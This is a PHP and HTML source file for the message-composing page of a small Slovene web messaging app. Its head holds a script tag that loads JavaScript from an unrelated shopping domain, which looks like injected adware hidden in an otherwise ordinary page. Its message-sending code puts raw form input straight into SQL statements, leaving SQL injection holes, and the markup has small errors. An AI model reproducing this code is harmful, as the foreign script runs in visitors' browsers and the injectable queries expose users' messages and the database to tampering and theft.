<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Poslana sporočila</title>

    <!-- Bootstrap core CSS -->
    <link href="bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron-narrow.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>

  <body>
    <div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
            <li role="presentation" class="active"><a href="novo.php"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></span></a></li>
            <li role="presentation"><a href="profil.php">Prejeta sporočila</a></li>
            <li role="presentation"><a href="poslano.php">Poslana sporočila</a></li>
            <li role="presentation"><a href="skupine.php">Ustvari skupino</a></li>
            <li role="presentation"><a href="odjava.php">Odjava</a></li>
          </ul>
        </nav>
        <h3 class="text-muted">Novo sporocilo</h3>
    <h4 class="text-muted"><?php session_start(); echo "Prijavljeni: ". $_SESSION['ime'].' '. $_SESSION['priimek'] .'</br>Zadnja prijava: '.$_SESSION['prijava']; ?></h4>
      </div>

      <div class="jumbotron" text-align="center">
	<form action="" method="POST">
		<table style="margin-left:auto; margin-right:auto;">
		<tr>
			<td>
				<input type="radio" value="stik" name="naslovnik">
			</td>
			<td>
				<h4>Posameznik:</h4>
			</td>
			<td>
				<select name="prejemnik">
					<?php
						include "povezava.php";
						session_start();
						if(isset($_SESSION['id']))
						{
							$id=$_SESSION['id'];
			            	$sql = "select u.ime, u.priimek, u.id_uporabnika from uporabnik u";
			            	$rez = mysqli_query($con, $sql);
			            	echo '<option>Izberi posameznika</option>';
			            	while($row = mysqli_fetch_row($rez)){
			            		echo '<option value="' . $row[2] . '">'.$row[0] . ' ' . $row[1] . '</option>';
		            	}
						}
						else
						{
							header("location:index.php");
						}
						
					?>	
				</select>
				</input><br>
			</td>
		</tr>
		<tr>
			<td>
				<input type="radio" value="skupina" name="naslovnik">
			</td>
			<td>
				<h4>Skupina:</h4>
			</td>
			<td>
				<select name="skupine">
					<?php
		            	$sqlskupina = "select s.id_skupine, s.naslov from skupina s where s.id_lastnika='$id'";
		            	$rezskupina = mysqli_query($con, $sqlskupina);
		            	echo '<option>Izberi skupino</option>';
		            	while($skupina = mysqli_fetch_row($rezskupina)){
		            		echo '<option value="' . $skupina[0] . '">' . $skupina[1] . '</option>'; 
		            	}
					?>	
				</select></input><br>
			</td>
		</tr>
	</table>
	<input class="form-control" name="zadeva" placeholder="Zadeva">
	<textarea class="form-control" placeholder="Vsebina" name="vsebina"></textarea>
	<br>
	<div>
		<input type="submit" class="btn btn-success" name="poslji" value="Pošlji" >
	</div>

	</form>

<?php
	$sendr=$id;
	if(isset($_POST['poslji'])){
		$vseb=$_POST['vsebina'];
		$zad=$_POST['zadeva'];
		if($zad!=""){
			if(isset($_POST['naslovnik'])){
				if($_POST['naslovnik'] == 'stik'){
					$resivr= $_POST['prejemnik'];
					$sqlstik="insert into transakcija(cas,sender,reciever,prebrano,vsebina,zadeva)
						 values(now(),'$sendr','$resivr',0,'$vseb','$zad')";
					mysqli_query($con,$sqlstik);
					header('Location: poslano.php');
				}
				else if($_POST['naslovnik'] == 'skupina'){
					$id_skupine = $_POST['skupine'];
					$sqlstiki = "select u.id_uporabnika from uporabnik u inner join skupinauporabnik s on u.id_uporabnika=s.id_dodanega where s.id_skupine='$id_skupine'";
					$rezstiki = mysqli_query($con, $sqlstiki);
					while($row = mysqli_fetch_row($rezstiki)){
						$sqlskupina="insert into transakcija(cas,sender,reciever,prebrano,vsebina,zadeva)
						values(now(),'$sendr','$row[0]',0,'$vseb','$zad')";
						mysqli_query($con,$sqlskupina);
						header('Location: poslano.php');
					}
				}
			}
			else{
				echo '<font color="red">Izberi prejemnika/prejemnike</font>';
			}
		}
		else
			echo '<font color="red">Vnesite zadevo!</red>';
	}

?>
</div>
</div>
</body>
</html>
<?php

//vpis v bazo

?>